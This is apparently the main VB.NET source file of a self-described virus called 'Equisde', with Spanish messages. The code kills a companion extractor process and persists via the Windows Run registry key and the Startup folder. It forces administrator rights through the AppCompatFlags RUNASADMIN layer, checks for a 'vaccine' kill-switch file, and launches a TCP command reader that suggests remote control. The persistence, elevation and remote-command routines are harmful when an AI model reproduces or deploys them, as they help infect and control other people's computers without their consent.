Imports Microsoft.Win32
Imports System.Security.Principal
Imports System.Threading
Public Class Main

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CommonStart()
    End Sub

    Sub CommonStart()
        Try
            Try
                Dim ProcesosLocales As Process() = Process.GetProcessesByName("Equisde")
                If ProcesosLocales.Length > 1 Then
                    End
                End If
            Catch ex As Exception
                Console.WriteLine("[Main@CommonStart(OneInstance)]Error: " & ex.Message)
            End Try
            Try
                For Each Extractor As Process In System.Diagnostics.Process.GetProcessesByName("EquisdeExtractor")
                    Extractor.Kill()
                Next
            Catch ex As Exception
                Console.WriteLine("[Main@CommonStart(CheckExtractor)]Error: " & ex.Message)
            End Try
            If My.Settings.CryptographyKey = Nothing Then
                Cipher.CreatePrivateKey()
            End If
            Try
                StartWithWindows()
                StartAsAdmin()
                CloseWithClue()
            Catch ex As Exception
                Console.WriteLine("[Main@CommonStart(CallStacks)]Error: " & ex.Message)
            End Try
            Try
                TCPCMDReader.Main()
            Catch ex As Exception
                Console.WriteLine("[Main@CommonStart(CallStacks(TCP CMD Reader is Before Anyone Else))]Error: " & ex.Message)
            End Try
        Catch ex As Exception
            Console.WriteLine("[Main@CommonStart]Error: " & ex.Message)
        End Try
    End Sub

#Region "Iniciar con Equisde"

    Dim CheckVaccine As Boolean = True
    Sub CloseWithClue()
        If CheckVaccine = True Then
            Try
                If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\ThisIsAVaccine.vcn") = True Then
                    Dim TextoArchivoVCN As String = Nothing
                    TextoArchivoVCN = My.Computer.FileSystem.ReadAllText(Starter.DIRCommons & "\ThisIsAVaccine.vcn")
                    If TextoArchivoVCN = "Vaccine.vcn /End, /Vaccine, -Equisde(XD;MAIN{CallStack:CloseWithClue} As EndProcess), /FuckItUp, -XD.Stop" Then
                        Console.WriteLine("Vacuna detectada")
                        End
                    Else
                        MsgBox("Vacuna falsa detectada, el virus se hace mas fuerte")
                    End If
                End If
            Catch ex As Exception
                Console.WriteLine("[Main@CloseWithClue]Error: " & ex.Message)
            End Try
        End If
    End Sub

    Sub StartWithWindows()
        Try
            Try
                Dim REGISTRADOR As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", True)
                If REGISTRADOR Is Nothing Then
                    Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                End If
                Dim NOMBRE As String = My.Application.Info.DirectoryPath.ToString & "\" & My.Application.Info.AssemblyName & ".exe"
                REGISTRADOR.SetValue(My.Application.Info.AssemblyName, NOMBRE, RegistryValueKind.String)
            Catch ex As Exception
                Console.WriteLine("[Main@StartWithWindows(Metod1:Regedit)]Error: " & ex.Message)
            End Try
            Try
                If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Equisde.exe") = True Then
                    My.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Equisde.exe")
                End If
                My.Computer.FileSystem.CopyFile(Application.StartupPath & "\Equisde.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Equisde.exe")
            Catch ex As Exception
                Console.WriteLine("[Main@StartWithWindows(Metod2_Folder)]Error: " & ex.Message)
            End Try
        Catch ex As Exception
            Console.WriteLine("[Main@StartWithWindows]Error: " & ex.Message)
        End Try
    End Sub

    Sub StartAsAdmin()
        Try
            Dim myUser As WindowsPrincipal = TryCast(Thread.CurrentPrincipal, WindowsPrincipal)
            Dim GoToAdmin As Boolean = False
            If myUser.IsInRole(WindowsIdentity.GetCurrent.Owner) Then
                GoToAdmin = True
                Console.WriteLine("El usuario es el Dueño")
            ElseIf myUser.IsInRole(WindowsIdentity.GetCurrent.User) Then
                Console.WriteLine("El usuario es un Usuario")
            ElseIf myUser.IsInRole(WindowsIdentity.GetCurrent.IsSystem.ToString) Then
                GoToAdmin = True
                Console.WriteLine("El usuario es un Administrador")
            ElseIf myUser.IsInRole(WindowsIdentity.GetCurrent.IsGuest.ToString) Then
                Console.WriteLine("El usuario es un Invitado")
            End If
            If GoToAdmin = True Then
                If myUser.IsInRole(WindowsBuiltInRole.Administrator) = False Then
                    Console.WriteLine("La aplicacion no tiene permisos de Administrador")
                    Try
                        Dim REGISTRADOR As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers", True)
                        Dim NOMBRE As String = "RUNASADMIN"
                        REGISTRADOR.SetValue(My.Application.Info.DirectoryPath.ToString & "\" & My.Application.Info.AssemblyName & ".exe", NOMBRE, RegistryValueKind.String)
                        Process.Start(Application.StartupPath & "\Equisde.exe")
                        Console.WriteLine("Aplicacion llamada con permisos de Administrador")
                        End
                    Catch ex As Exception
                        Console.WriteLine("[Main@StartAsAdmin(GiveAdmin)]Error: " & ex.Message)
                    End Try
                End If
            End If
        Catch ex As Exception
            Console.WriteLine("[Main@StartAsAdmin]Error: " & ex.Message)
        End Try
    End Sub
#End Region
End Class